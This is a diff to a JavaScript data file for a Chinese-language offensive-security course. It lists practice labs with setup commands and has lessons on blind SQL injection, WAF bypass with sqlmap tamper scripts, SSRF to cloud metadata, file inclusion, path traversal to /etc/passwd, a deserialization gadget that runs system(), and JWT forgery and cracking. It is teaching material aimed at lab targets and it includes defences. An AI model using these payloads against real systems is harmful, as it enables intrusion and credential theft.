+       hints:['报告里用业务语言描述影响：不是「存在 SQL 注入」，而是「可读取 12 万用户手机号」。','任何测试前先拿到书面授权，邮件也算。']}
+    ],
+    pitfalls:[
+      '贪多，五类同时学，最后都不入门。',
+      '只收藏 writeup 不动手，看的时候都懂，做的时候全不会。',
+      '为了炫技去测真实网站，把前途搭进去。'
+    ],
+    quiz:{q:'新手最有效的起步方式是？',
+      opts:['同时学五类题型，广泛涉猎','先挑一类（如 Web）打透，建立正反馈后再扩展','只看视频不动手','直接去打 HTB 困难机器'],
+      a:1, exp:'技能会迁移，信心不会。先把一类做到「能独立做出中等题」，再横向扩展，比五类都浅尝有效得多。'}
+  }
+  ]
+},
+
+];
+
+/* ================= 靶场中心 ================= */
+const LABS = [
+  { id:'dvwa', name:'DVWA', cat:'Web 靶场', diff:'入门', size:'约 500 MB',
+    desc:'最经典的 PHP 靶场，四档难度。SQL 注入、XSS、文件上传、命令注入、CSRF 全覆盖，每关都能调难度。',
+    run:'docker run -d --name dvwa -p 8080:80 vulnerables/web-dvwa',
+    url:'http://127.0.0.1:8080', login:'admin / password', reset:'docker rm -f dvwa',
+    points:['SQL 注入','盲注','XSS','文件上传','命令注入','CSRF','暴力破解'],
+    note:'首次进入点页面底部 Create/Reset Database 建库；右上角 DVWA Security 调难度。' },
+  { id:'juice', name:'OWASP Juice Shop', cat:'Web 靶场', diff:'进阶', size:'约 400 MB',
+    desc:'现代前后端技术栈（Angular + Node）的综合靶场，100+ 挑战，覆盖 OWASP Top 10 与真实业务逻辑漏洞。',
+    run:'docker run -d --name juice -p 3000:3000 bkimminich/juice-shop',
+    url:'http://127.0.0.1:3000', login:'注册即可，无需预设账号', reset:'docker rm -f juice',
+    points:['注入','XSS','越权','JWT','SSRF','文件上传','业务逻辑'],
+    note:'自带进度面板，做对会弹提示，适合练「自己找洞」而不是照着步骤做。' },
+  { id:'bwapp', name:'bWAPP', cat:'Web 靶场', diff:'入门', size:'约 600 MB',
+    desc:'100 多个漏洞关卡，覆盖面比 DVWA 更广，含 LDAP 注入、XML 注入、SSRF、反序列化等。',
+    run:'docker run -d --name bwapp -p 8081:80 raesene/bwapp',
+    url:'http://127.0.0.1:8081/install.php', login:'bee / bug', reset:'docker rm -f bwapp',
+    points:['LDAP','XML 注入','SSRF','文件包含','反序列化','XPath'],
+    note:'先访问 /install.php 点 install 按钮初始化数据库。' },
+  { id:'webgoat', name:'WebGoat', cat:'Web 靶场', diff:'入门', size:'约 300 MB',
+    desc:'OWASP 官方教学靶场，每关配讲解与提示，适合边学边打，覆盖 JWT、XXE、越权、密码重置。',
+    run:'docker run -d --name webgoat -p 8888:8888 -p 9090:9090 webgoat/webgoat',
+    url:'http://127.0.0.1:8888/WebGoat', login:'注册本地账号', reset:'docker rm -f webgoat',
+    points:['JWT','XXE','越权','密码重置','SQL 注入'],
+    note:'每题都有 Hint 和 Solution，卡住可以看思路而不是看答案。' },
+  { id:'vulhub', name:'Vulhub 漏洞复现集', cat:'漏洞复现', diff:'进阶', size:'按需拉取',
+    desc:'几百个真实 CVE 的 docker-compose 环境，一行命令起一个漏洞现场，最适合练「CVE 复现 + 写报告」。',
+    run:'git clone https://github.com/vulhub/vulhub.git\ncd vulhub/log4j/CVE-2021-44228 && docker compose up -d',
+    url:'按各漏洞 README 的端口', login:'见 README', reset:'docker compose down',
+    points:['Log4Shell','Shiro','Fastjson','Struts2','Weblogic','ThinkPHP'],
+    note:'每个目录都有一份 README 写清复现步骤；只在本地起，别把这些环境暴露到公网。' },
+  { id:'msf2', name:'Metasploitable 2', cat:'内网与域', diff:'入门', size:'约 800 MB',
+    desc:'经典的内网练习靶机，一台机器上堆满漏洞服务（vsftpd 后门、Samba、UnrealIRCd、Tomcat），适合练 nmap → searchsploit → msf 全流程。',
+    run:'# 虚拟机方式：从 VulnHub 下载 Metasploitable2 的 .zip，解压后用 VirtualBox/VMware 导入\n# 默认账号 msfadmin / msfadmin，网卡设为「仅主机」或 NAT',
+    url:'VulnHub: https://www.vulnhub.com/entry/metasploitable-2,29/', login:'msfadmin / msfadmin', reset:'虚拟机快照还原',
+    points:['端口扫描','服务识别','vsftpd 后门','Samba 漏洞','Web 应用','提权'],
+    note:'务必把网卡设成仅主机/NAT，绝不能桥接到办公网——这台机器是故意留洞的。' },
+  { id:'msf3', name:'Metasploitable 3', cat:'内网与域', diff:'进阶', size:'约 5 GB',
+    desc:'Windows 与 Ubuntu 双版本，漏洞更现代（含 Windows 提权、Jenkins、ManageEngine），适合练 Windows 侧攻击。',
+    run:'# 需要 Vagrant + VirtualBox（约 5 GB 镜像）\ngit clone https://github.com/rapid7/metasploitable3.git\ncd metasploitable3 && vagrant up',
+    url:'打包完成后 vagrant 会打印 IP', login:'vagrant / vagrant', reset:'vagrant destroy -f && vagrant up',
+    points:['Windows 提权','Jenkins','SMB','Web 应用','凭据复用'],
+    note:'构建要 30 分钟以上，建议先只起 win2k8 一台。' },
+  { id:'goad', name:'GOAD（Active Directory 靶场）', cat:'内网与域', diff:'高级', size:'需 16 GB 内存',
+    desc:'由 5 台机器组成的完整域环境，专门练 Kerberoasting、ACL 滥用、BloodHound 路径分析、域内横向。',
+    run:'git clone https://github.com/Orange-Cyberdefense/GOAD.git\ncd GOAD && ./goad.sh -t install -l GOAD -p virtualbox',
+    url:'按安装结束提示的 DC IP', login:'见项目 README 的账号表', reset:'./goad.sh -t destroy',
+    points:['Kerberoasting','AS-REP','ACL 滥用','BloodHound','DCSync','横向'],
+    note:'资源要求高，建议在 16 GB 以上内存的机器上跑；小内存可以用 THM 的 Attacktive Directory 房间替代。' },
+  { id:'thm', name:'TryHackMe', cat:'综合平台', diff:'入门→进阶', size:'在线',
+    desc:'引导式房间，一台机器一条完整攻击链，有文字引导。最适合把零散知识串成流程。',
+    run:'# 在线平台，浏览器直接访问即可\n# 推荐路径：Pre Security → Jr Penetration Tester → Offensive Pentesting',
+    url:'https://tryhackme.com', login:'注册免费账号', reset:'房间可重置',
+    points:['完整攻击链','报告练习','蓝队房间','AD 房间'],
+    note:'免费房间足够入门，AttackBox 每天有免费时长。' },
+  { id:'htb', name:'HackTheBox', cat:'综合平台', diff:'进阶→高级', size:'在线',
+    desc:'无引导的实战靶机，难度从 Easy 到 Insane。适合检验「不看 writeup 能不能独立打通」。',
+    run:'# 在线平台，也可下载 VIP 靶机离线跑\n# 建议顺序：Starting Point → Easy → Medium',
+    url:'https://app.hackthebox.com', login:'注册账号', reset:'机器可重置',
+    points:['独立渗透','Windows/AD','Pwn','报告'],
+    note:'Starting Point 有官方 walkthrough，先做完再打 Easy 机器。' },
+  { id:'psw', name:'PortSwigger Web Security Academy', cat:'综合平台', diff:'入门→高级', size:'在线免费',
+    desc:'Web 安全最好的免费教材：每个漏洞类型先讲原理再给实验环境，300+ 关卡，难度分级明确。',
+    run:'# 在线实验环境，无需部署\n# 建议按 Learning Path 顺序做：SQLi → XSS → CSRF → SSRF → 反序列化',
+    url:'https://portswigger.net/web-security', login:'注册免费账号', reset:'每关可重置',
+    points:['SQL 注入','XSS','SSRF','反序列化','JWT','请求走私'],
+    note:'每关都有官方解答视频，卡 30 分钟再看，收益最大。' },
+  { id:'pwn', name:'pwn.college + ROP Emporium', cat:'逆向与 Pwn', diff:'进阶', size:'在线/本地',
+    desc:'pwn.college 是 Arizona State 的课程式平台，从汇编讲到堆利用；ROP Emporium 专练 ROP 链构造。',
+    run:'# 本地练 ROP：\nwget https://ropemporium.com/binary/ret2win.zip && unzip ret2win.zip\n# 或直接用 pwn.college 在线环境',
+    url:'https://pwn.college  |  https://ropemporium.com', login:'pwn.college 需注册', reset:'重新下载',
+    points:['栈溢出','ret2win','ROP','格式化字符串','堆'],
+    note:'先装 pwntools：pip install pwntools，配合 pwndbg 调试。' },
+  { id:'crypto', name:'CryptoHack', cat:'逆向与 Pwn', diff:'入门→进阶', size:'在线免费',
+    desc:'交互式密码学闯关，从 XOR、模运算一直讲到 RSA 与格。每题都在浏览器里跑 Python。',
+    run:'# 在线平台\n# 前置：会一点 Python，装 pycryptodome 和 sage 更好',
+    url:'https://cryptohack.org', login:'注册免费账号', reset:'无需',
+    points:['XOR','RSA 误用','离散对数','格密码'],
+    note:'Introduction to Crypto 全做完，RSA 常见误用基本就通了。' },
+  { id:'dfir', name:'CyberDefenders / Blue Team Labs', cat:'取证与蓝队', diff:'进阶', size:'在线',
+    desc:'真实取证镜像（内存、磁盘、流量）配问题清单，练的是「从证据里回答业务问题」。',
+    run:'# 在线平台，下载挑战包本地分析\n# 工具：Volatility3、Autopsy、Wireshark、Eric Zimmerman 套件',
+    url:'https://cyberdefenders.org  |  https://blueteamlabs.online', login:'注册免费账号', reset:'重新下载',
+    points:['内存取证','磁盘取证','流量分析','恶意软件','时间线'],
+    note:'做完一定写时间线，这是取证报告的核心交付物。' },
+  { id:'detect', name:'DetectionLab + Atomic Red Team', cat:'取证与蓝队', diff:'高级', size:'需 16 GB 内存',
+    desc:'一套可复现的企业级检测环境（DC + Win10 + Splunk/Zeek/Sysmon），配 Atomic Red Team 攻击模拟，用来验证检测规则到底响不响。',
+    run:'git clone https://github.com/clong/DetectionLab.git\ncd DetectionLab/Terraform && terraform init && terraform apply',
+    url:'按 Terraform 输出', login:'vagrant / vagrant', reset:'terraform destroy',
+    points:['Sysmon','日志管道','ATT&CK 映射','检测规则验证'],
+    note:'也可以用 Atomic Red Team 在单机上跑单个技术，轻量很多。' },
+  { id:'k8s', name:'Kubernetes Goat / Killercoda', cat:'取证与蓝队', diff:'进阶', size:'在线/本地',
+    desc:'K8s Goat 是故意配置错误的集群场景，练 ServiceAccount 滥用、RBAC 越权、容器逃逸；Killercoda 有免费在线集群。',
+    run:'docker run -d --name k8s-goat -p 1234:1234 -p 1236:1236 madhuakula/k8s-goat-all-in-one',
+    url:'http://127.0.0.1:1234', login:'见项目 README', reset:'docker rm -f k8s-goat',
+    points:['SA Token','RBAC','特权 Pod','hostPath 逃逸','审计日志'],
+    note:'想练真实集群可以用 Killercoda 的免费 3 节点环境，避免本机吃满内存。' }
+];
+
+/* ================= 扩展课程 / 深度增强 ================= */
+const EXTRA = {
+'m2': [
+{
+  id:'l2-5', title:'盲注与 WAF 绕过：没有回显时怎么「问」数据库', time:'55 分钟', level:'高级',
+  tags:['盲注','时间盲注','sqlmap','tamper','WAF'],
+  goal:[
+    '分清「有回显 / 布尔 / 时间」三种注入通道',
+    '手工用二分法猜出库名，理解每位字符在问什么',
+    '用 tamper 脚本绕过简单关键字过滤，并说清 WAF 为什么不是修复'
+  ],
+  concepts:[
+    {t:'盲注的本质', d:'页面不给你数据，只给你「真 / 假」两种反应。于是把「库名是什么」拆成一串「第 N 个字符是不是大于 X」的问题，一位一位问出来。'},
+    {t:'时间盲注', d:'连页面差异都没有时，用 sleep() 的响应延迟当信号。每个问题都要等几秒，所以慢，但几乎不受前端渲染差异干扰。'},
+    {t:'tamper', d:'sqlmap 的变形脚本：把空格换成注释、把关键字拆开、做 URL 编码。它绕的是「特征匹配」，不是逻辑漏洞。'}
+  ],
+  steps:[
+    {title:'先判断走哪条通道',
+     cmd:`id=1' and 1=1-- -
+id=1' and 1=2-- -`,
+     why:'两次响应完全相同 → 没有布尔通道，只能试时间盲注；两次不同 → 有布尔通道，可以用二分法；页面直接报错 → 报错注入最快。先定通道，再谈技术，否则会一直在错误的路上试。',
+     out:'一份判断：有回显 / 有布尔差异 / 只有时间差异。',
+     hints:['差异可能很细微：一个字符、一个空 div、甚至只有 HTTP 状态码不同。','用 Burp 的 Compare 功能对比两次响应，比肉眼可靠。']},
+    {title:'布尔盲注：把「是什么」变成「是不是」',
+     cmd:`id=1' and length(database())>5-- -
+id=1' and ascii(substr(database(),1,1))>100-- -`,
+     why:'先问长度（缩小范围），再逐位问 ASCII 值。substr 取第 N 个字符，ascii 转成数字，于是字符串比较变成了数值比较——这就是能用大于号猜的原因。',
+     out:'页面在真/假之间切换，据此能确定长度和每一位的字符。',
+     hints:['先猜长度：length(database())>N，二分三次就能定范围。','MySQL 里也可以直接用 substr(database(),1,1)=\'d\' 做等值比较，但二分更快。'],
+     try:{need:['length','database'], hint:'先用 length() 问长度，再用 substr/ascii 逐位问。'}},
+    {title:'时间盲注：用延迟当唯一的信号',
+     cmd:`id=1' and if(1=1,sleep(3),0)-- -
+id=1' and if(ascii(substr(database(),1,1))>100,sleep(3),0)-- -`,
+     why:'条件为真就睡 3 秒。你不再依赖页面内容，只依赖响应时间。代价是每个问题至少 3 秒，所以脚本必须用二分法把请求数压下来。',
+     out:'响应时间稳定出现 3 秒 / 0 秒的两种分布。',
+     hints:['sleep 被过滤时可用 benchmark(1000000,md5(1)) 或 heavy query 代替。','网络抖动会造成误判，先测三次基线延迟，再设阈值。']},
+    {title:'让 sqlmap 接管，但指定技术',
+     cmd:`sqlmap -u "http://192.168.56.10/vulnerabilities/sqli_blind/?id=1&Submit=Submit" \\
+  --cookie="PHPSESSID=abc123; security=low" \\
+  --technique=BT --threads 4 --batch --dbs`,
+     why:'--technique=B 只跑布尔、T 只跑时间，能省掉大量试探请求；--threads 4 提速但别开太大，容易把库或 WAF 打崩。你已经手工验证过，所以知道它在做什么。',
+     out:'逐步输出注入点、后端 DBMS、可用数据库列表。',
+     hints:['加 --dbms=mysql 能少走弯路。','--flush-session 可以清掉之前的错误缓存，重头再来。'],
+     try:{need:['--technique'], hint:'指定注入技术的参数是 --technique。'}},
+    {title:'被拦了？试 tamper 变形',
+     cmd:`sqlmap -u "http://target/item.php?id=1" --batch --tamper=space2comment,charencode,randomcase`,
+     why:'space2comment 把空格换成 /**/，charencode 做 URL 编码，randomcase 随机大小写。WAF 靠正则匹配 union select 这类特征，变形后特征就碎了。',
+     out:'原本返回 403 的请求开始返回正常页面。',
+     hints:['先用 --tamper=xx --identify-waf 看它识别出什么 WAF，再挑脚本。','多个 tamper 用逗号串联，顺序会影响效果，需要试。']},
+    {title:'站到防守方：WAF 只是创可贴',
+     cmd:`# 真修复：预编译参数化 + 数据库最小权限 + 关闭详细报错 + 输入类型校验
+# WAF 只能提高攻击成本，改个编码就绕过了`,
+     why:'WAF 拦的是「已知的坏字符串」，而注入的根因是「数据被当成代码」。只要根因还在，攻击者换一种编码、换一个注入点就能继续。WAF 的价值是争取修复时间，不是终点。',
+     out:'能说清「WAF 挡住的是什么层次的攻击」。',
+     hints:['盲注的流量特征很像正常请求，WAF 命中率天生低。','真正有效的兜底是数据库账号只读、只授权需要的表。']}
+  ],
+  deep:[
+    {t:'为什么 ascii() 是关键一步', d:'字符串比较对「大于/小于」不敏感，而 ASCII 码是整数，可以直接二分。把字符转成数字，是盲注能从「猜」变成「算」的核心技巧。'},
+    {t:'二分把 26 次压到 5 次', d:'线性猜一个字母平均 13 次请求，二分只需 log2(95)≈7 次。盲注动辄上千请求，二分与否决定了是 10 分钟还是 2 小时。'},
+    {t:'报错注入为什么最快', d:'updatexml / extractvalue 能把查询结果塞进报错信息里，一次请求拿一整段数据。所以防守方关闭详细报错，收益极高。'}
+  ],
+  labs:[
+    {name:'DVWA · SQL Injection (Blind)', task:'难度调 low，不借助工具，用布尔盲注手工推出当前数据库名的前 3 个字符，记录每次请求的 payload 与判断。'},
+    {name:'sqli-labs · Less-8', task:'用时间盲注写一个 Python 脚本，二分猜出 users 表第一行 username 的长度与内容，统计总请求数。'},
+    {name:'PortSwigger · Blind SQL injection with time delays', task:'完成该实验，理解为什么「响应时间」在真实网络里要多次采样才能当证据。'}
+  ],
+  pitfalls:[
+    '不先判断通道就狂发 union，请求全被 403 还不知道为什么。',
+    '时间盲注不测基线延迟，把网络抖动当成真信号。',
+    '线程开到 20 以上，把数据库连接池打满，业务直接挂掉。'
+  ],
+  quiz:{q:'盲注里用二分法猜字符，最主要的收益是？',
+    opts:['payload 更短','把每个字符的平均请求数从线性降到对数，大幅缩短时间','能绕过 WAF','能直接拿到明文密码'],
+    a:1, exp:'盲注的成本就是请求次数。二分把 95 种可能压到 7 次以内，是盲注提速最有效的手段。'},
+  challenge:[
+    '写一个脚本：给定注入点，自动判断通道（布尔/时间），并用二分法导出 database() 与当前用户。',
+    '在 DVWA 上开启 PHPIDS（如果有）或自己加一条 WAF 规则，统计你的 payload 有多少被拦、被哪条规则拦。'
+  ]
+},
+{
+  id:'l2-6', title:'SSRF、文件包含与路径穿越：让服务器替你做事', time:'50 分钟', level:'高级',
+  tags:['SSRF','LFI','php://filter','路径穿越'],
+  goal:[
+    '识别「服务端替你访问」的功能点',
+    '用 php://filter 读出 PHP 源码而不是执行它',
+    '说清文件包含如何一步步变成命令执行，以及怎么彻底堵住'
+  ],
+  concepts:[
+    {t:'SSRF', d:'你提交一个地址，服务器去请求它。服务器在内网、有权限，于是你能借它的身份访问你本来够不到的东西。'},
+    {t:'LFI', d:'include($_GET[page]) 这类写法会让攻击者指定要包含的文件。包含本地文件是读源码，包含日志/上传文件就可能变成执行代码。'},
+    {t:'php://filter', d:'一个流包装器，可以在读取文件时做 base64 编码。于是 PHP 文件不会被当成代码执行，而是把源码当文本吐给你。'}
+  ],
+  steps:[
+    {title:'找「服务端替你访问」的地方',
+     cmd:`# 常见参数名：url= image= path= file= src= redirect= next= callback=
+# 测试：把值换成一个你能观测到的地址（自己起的 http 服务）
+python3 -m http.server 8000`,
+     why:'先证明「服务器真的会去访问我给的地址」，再谈打内网。这一步用你自己起的服务最安全，能明确看到请求是否到达、来自哪个 IP、带什么头。',
+     out:'你的 http.server 日志里出现一条来自目标服务器的 GET 请求。',
+     hints:['用 Collaborator 或自己的公网监听更直观，但本地靶场用 http.server 就够。','注意区分「前端请求」和「后端请求」——只有后端发起的才算 SSRF。']},
+    {title:'打内网：从本机端口到云元数据',
+     cmd:`url=http://127.0.0.1:8080/admin
+url=http://169.254.169.254/latest/meta-data/
+url=http://10.0.0.5:6379/`,
+     why:'127.0.0.1 是服务器自己，很多管理接口只监听本地；169.254.169.254 是云元数据服务；内网网段里的 Redis、MySQL 往往没有认证。SSRF 的价值就在这些「只有内网能碰」的资产上。',
+     out:'返回内网页面的 HTML、云凭据 JSON、或 Redis 的报错信息。',
+     hints:['先用 /latest/meta-data/ 确认存在，再取 iam/security-credentials/ 拿角色名。','端口不通和「被拒绝」要区分：超时说明被防火墙丢包，拒绝说明端口没开。']},
+    {title:'读源码：php://filter',
+     cmd:`page=php://filter/convert.base64-encode/resource=config.php
+# 把返回的 base64 解出来
+echo "PD9waHA..." | base64 -d`,
+     why:'直接 include config.php 会被 PHP 执行、结果为空。加上 filter 让它先编码成 base64 再输出，PHP 引擎就不会解析里面的代码，你拿到的是原始源码——数据库账号密码常常就在这里。',
+     out:'一段 base64，解码后是完整 PHP 源码。',
+     hints:['resource 后面跟相对路径，文件名不带 .php 有时也能命中（取决于配置）。','读不到时试试 resource=../../etc/passwd 验证包含本身有没有生效。'],
+     try:{need:['php://filter'], hint:'用 PHP 的流包装器，配合 base64 编码读取源码。'}},
+    {title:'从读到执行：文件包含的三条常见路径',
+     cmd:`# 1) 包含日志：把 payload 写进 access.log，再包含它
+# 2) 包含上传的图片马：图片头 + PHP 代码
+# 3) php://input 直接提交代码（需 allow_url_include=On）`,
+     why:'包含本身只是「读文件」。但当被包含的文件里含有你的 PHP 代码，它就会被执行。日志、上传目录、临时文件都是可控内容，所以 LFI 常常直接升级成 RCE。',
+     out:'页面返回命令执行结果，或用一句话木马连上。',
+     hints:['日志包含需要知道日志路径，且 UA 里不能有会被截断的字符。','php://input 需要 POST 提交且 allow_url_include 开启，很多环境默认关。']},
+    {title:'路径穿越：../../ 为什么总能穿过',
+     cmd:`file=../../../../etc/passwd
+file=..%2f..%2f..%2fetc%2fpasswd
+file=....//....//etc/passwd`,
+     why:'程序把用户输入直接拼进路径，就给了你向上跳目录的能力。做一次 ../ 过滤的代码很常见，但 ....// 过滤后剩下的还是 ../ ——这就是「过滤一次」的经典失败。',
+     out:'返回 /etc/passwd 内容，或 Windows 下的 win.ini。',
+     hints:['被过滤 ../ 时试 URL 编码、双重编码、反斜杠、绝对路径。','Windows 下还可以试 C:\\windows\\win.ini 和短文件名。'],
+     try:{need:['..'], hint:'用向上跳目录的写法。'}},
+    {title:'防护：把「路径」和「URL」都当成不可信输入',
+     cmd:`# 文件：白名单映射（page=about → about.php），不要拼路径
+# 路径：realpath() 后校验前缀是否在允许目录内
+# URL：协议白名单 + 解析后校验 IP 不在内网段 + 禁止跟随跳转
+# PHP：allow_url_include=Off，open_basedir 限制目录`,
+     why:'黑名单永远漏。白名单让「不在列表里的值」直接不存在；realpath 能解掉 ../ 和软链接；SSRF 要解析 DNS 后判断真实 IP，否则会被 DNS rebinding 绕过。',
+     out:'同样的 payload 全部返回 400 / 空页面。',
+     hints:['只校验字符串里有没有 ../ 一定会被编码绕过。','禁止 302 跟随很关键，否则白名单域名可以跳转到内网。']}
+  ],
+  deep:[
+    {t:'为什么 SSRF 在云上危害翻倍', d:'本地 SSRF 最多摸到内网服务；云上 SSRF 能直接拿实例角色凭据，等于拿到一整套 API 权限，往往一步到「接管云账号」。'},
+    {t:'gopher:// 为什么是 SSRF 的核武器', d:'它能构造任意 TCP 数据流，于是可以打 Redis 写 crontab、打 MySQL 未授权、打 FastCGI——把「能发 HTTP」升级成「能发任意协议」。'},
+    {t:'LFI 与 RFI 的分界', d:'LFI 包含本地文件，需要你先能写入；RFI 包含远程文件，需要 allow_url_include=On。前者更常见，后者更直接。'}
+  ],
+  labs:[
+    {name:'DVWA · File Inclusion (low)', task:'用 page=../../../../etc/passwd 读出系统账号，再试 php://filter 读出 include.php 的源码。'},
+    {name:'PortSwigger · SSRF 系列（前 3 关）', task:'完成 basic SSRF against local server、against another back-end system、blacklist-based filter，记录每种过滤的绕过思路。'},
+    {name:'Vulhub · 任选一个 SSRF 漏洞', task:'docker compose 起环境，复现并写一段 5 行的修复建议。'}
+  ],
+  pitfalls:[
+    '把前端跳转当 SSRF——只有服务端发起的请求才算。',
+    '包含日志时 UA 里带了空格或引号，payload 被日志格式截断。',
+    '只过滤 ../ 就以为安全，编码一次就绕过了。'
+  ],
+  quiz:{q:'php://filter/convert.base64-encode/resource=config.php 的作用是？',
+    opts:['把 config.php 加密','让 PHP 不解析该文件，而是把源码 base64 编码后输出','执行 config.php 里的代码','把文件上传到服务器'],
+    a:1, exp:'流过滤器在读取阶段处理数据，PHP 引擎拿到的是 base64 文本而不是代码，所以源码被原样泄露，常用于读数据库配置。'},
+  challenge:[
+    '在本机用 Flask 写一个有 SSRF 的小服务，然后用你自己的攻击脚本证明它，再写出修复版本并证明修复有效。',
+    '写一个脚本，自动枚举 file= 参数的路径穿越深度（1 到 8 层），找出能读到 /etc/passwd 的最短 payload。'
+  ]
+},
+{
+  id:'l2-7', title:'反序列化与 JWT：把数据变成代码的两种方式', time:'55 分钟', level:'高级',
+  tags:['反序列化','POP 链','JWT','签名'],
+  goal:[
+    '认出序列化数据的特征，判断哪一段是用户可控的',
+    '理解魔术方法为什么会被自动触发，POP 链是怎么拼起来的',
+    '手工解出 JWT 结构，并说清 alg:none 与弱密钥两种失效方式'
+  ],
+  concepts:[
+    {t:'反序列化', d:'把字符串还原成对象。危险在于「还原」过程会自动调用魔术方法（__wakeup、__destruct），而对象的属性值完全由攻击者控制。'},
+    {t:'POP 链', d:'面向属性编程：不改代码，只改对象的属性，让程序沿着「自动调用 → 属性可控 → 再调用」的路径走到危险函数（system、eval）。'},
+    {t:'JWT', d:'header.payload.signature 三段 base64url。payload 是明文可读的，安全性完全来自签名——签名算法一旦可被指定为 none 或密钥太弱，就等于没有。'}
+  ],
+  steps:[
+    {title:'先认出「这是序列化数据」',
+     cmd:`# PHP：O:4:"User":2:{s:4:"name";s:5:"admin";}
+# Java：rO0ABXNy...（base64 后的 AC ED 00 05）
+# Python pickle：gASV... 或 \\x80\\x04\\x95
+# JWT：eyJhbGciOi... 以 eyJ 开头`,
+     why:'看到 O:4 就知道是 PHP 序列化，看到 rO0AB 就知道是 Java 序列化，看到 eyJ 就是 JWT。判断类型之后，才知道该找反序列化 gadget 还是该爆破签名密钥。',
+     out:'能说出这段数据是什么语言、哪个框架产生的。',
+     hints:['Cookie、隐藏表单字段、remember_me、viewstate 都是高发位置。','把 base64 解出来看开头字节，比猜准。'],
+     try:{need:['eyJ'], hint:'JWT 通常以这一段开头（base64 的 {"）。'}},
+    {title:'魔术方法：为什么「只是还原对象」会执行代码',
+     cmd:`class User {
+  public $cmd = 'whoami';
+  function __destruct(){ system($this->cmd); }
+}
+unserialize('O:4:"User":1:{s:3:"cmd";s:2:"id";}');`,
+     why:'__destruct 在对象销毁时自动调用，参数取自你控制的属性 $cmd。程序本身没打算执行命令，是你把「属性」改成了命令。这就是反序列化漏洞的原型。',
+     out:'页面返回 id 命令的输出。',
+     hints:['__wakeup、__toString、__call 都是常见的触发点。','真实代码里链子更长：A 的 __destruct 调用 B 的方法，B 再调用 C……这就是 POP 链。']},
+    {title:'拆开 JWT 看三段',
+     cmd:`echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.xxx" \\
+  | cut -d. -f1-2 | tr . '\\n' | while read s; do
+      echo "$s==" | base64 -d 2>/dev/null; echo; done`,
+     why:'header 说明算法，payload 放用户与角色，signature 是前两段的签名。payload 只是 base64 而不是加密——任何人都能读到，所以绝不能放密码、手机号这类敏感信息。',
+     out:'header 是 {"alg":"HS256","typ":"JWT"}，payload 是 {"user":"guest","role":"user"}。',
+     hints:['base64url 用 - 和 _，解码前要换回 + 和 /，并补 = 号。','浏览器 F12 的 Application → Cookies 里常能看到 token。'],
+     try:{need:['base64'], hint:'JWT 的三段都是 base64url 编码，可以解出来。'}},
+    {title:'两种最常见的失效：alg:none 与弱密钥',
+     cmd:`# 1) 把 header 改成 {"alg":"none"}，去掉签名段，看服务端是否接受
+# 2) 弱密钥爆破
+hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
+# 命中后可以任意改 payload 重新签名`,
+     why:'如果服务端「按 header 里的算法来验签」，那它就可能接受 none（不验签）。如果密钥是 secret 这种弱口令，爆破几分钟就出来，之后你能给自己签任何角色。',
+     out:'改过的 token 被接受，或爆破出原始密钥。',
+     hints:['HS256 与 RS256 混用还存在「用公钥当 HMAC 密钥」的经典绕过。','jku / kid 参数如果可控，还能让它去加载你指定的公钥。'],
+     try:{need:['16500'], hint:'hashcat 里 JWT 的模式号是 16500。'}},
+    {title:'防护：让「不可信数据」永远不进入危险路径',
+     cmd:`# 反序列化：不反序列化用户输入；必须用时签名 + 白名单类（Java 的 ObjectInputFilter）
+# JWT：算法固定白名单（只允许 RS256）、密钥 >= 32 字节随机、校验 exp/nbf/aud、禁止 none
+# 通用：序列化数据当 token 用，就要像对待密码一样对待它`,
+     why:'这两类漏洞的共同点是「攻击者能控制被解释的数据结构」。解法不是过滤字符，而是让数据不再被当成结构解释——签名验证 + 类型白名单 + 算法固定，是唯一可靠的三件套。',
+     out:'同样的篡改 token 被 401 拒绝。',
+     hints:['别用「黑名单过滤 O:」这种方式，编码、嵌套都能绕。','JWT 不要存敏感信息，payload 是公开的。']}
+  ],
+  deep:[
+    {t:'POP 链为什么需要「跳板」', d:'危险函数往往不在你能直接控制的对象里。链子的作用是通过属性赋值，把「一个对象的销毁」串到「另一个对象的方法调用」，最后落到 system。'},
+    {t:'为什么 payload 不能加密代替签名', d:'加密解决机密性，签名解决完整性。JWT 需要的是「不能被篡改」，所以必须签名；而 payload 公开是可接受的——只要不放敏感数据。'},
+    {t:'反序列化漏洞为什么难修', d:'gadget 藏在整个依赖树里（框架、第三方库），你修了自己的代码，依赖里还有链子。所以主流做法是「不反序列化不可信数据」，而不是逐个堵 gadget。'}
+  ],
+  labs:[
+    {name:'PortSwigger · JWT 系列', task:'完成 JWT authentication bypass via unverified signature、via alg:none、via weak signing key 三关。'},
+    {name:'Vulhub · 任选 PHP 反序列化环境', task:'起环境，构造一个最小 POP 链执行 id，并画出调用链示意图。'},
+    {name:'Juice Shop · JWT 相关挑战', task:'找到 token 伪造相关的挑战并完成，记录你改了 payload 的哪个字段。'}
+  ],
+  pitfalls:[
+    '以为 JWT 是加密的，把用户手机号塞进 payload。',
+    '只校验签名不校验 exp，token 永不过期。',
+    '用黑名单过滤序列化字符串，换个编码就绕过。'
+  ],
+  quiz:{q:'服务端接受 alg:none 的 JWT，最直接的后果是？',
+  opts:['token 会变得更大','攻击者可以不带签名任意伪造 payload，等于身份认证完全失效','token 无法解码','只能读取不能修改'],
+  a:1, exp:'alg:none 意味着不验证签名，任何人都能构造任意 payload 通过校验。修复方式是服务端固定允许的算法，绝不采信 header 里的 alg。'},
+  challenge:[
+    '写一段 PHP 代码复现「属性可控 → __destruct → system」的完整链条，再给出两种修复方案并对比。',
+    '用 Python 实现一个 JWT 签发/校验服务，故意留一个 alg 混淆漏洞，然后用脚本打穿它，最后打补丁。'
+  ]
+}
+],
+
+'m3': [
+{
+  id:'l3-3', title:'Active Directory 入门：域内三条最常见的路', time:'55 分钟', level:'高级',
+  tags:['AD','Kerberoasting','BloodHound','域渗透'],
+  goal:[
+    '理解域、DC、SPN、票据这几个概念的关系',
+    '完成一次 Kerberoasting 并离线破解服务账号',
+    '用 BloodHound 找「当前权限到域管」的最短路径'
+  ],
+  concepts:[
+    {t:'域与 DC', d:'域是一组共享认证的机器，域控（DC）是发证机关。拿下 DC 基本等于拿下整个内网。'},
+    {t:'SPN 与票据', d:'服务用 SPN 标识自己。任何域用户都能为某个 SPN 申请服务票据，而票据是用「服务账号的密码哈希」加密的——于是可以拿回去离线爆破。'},
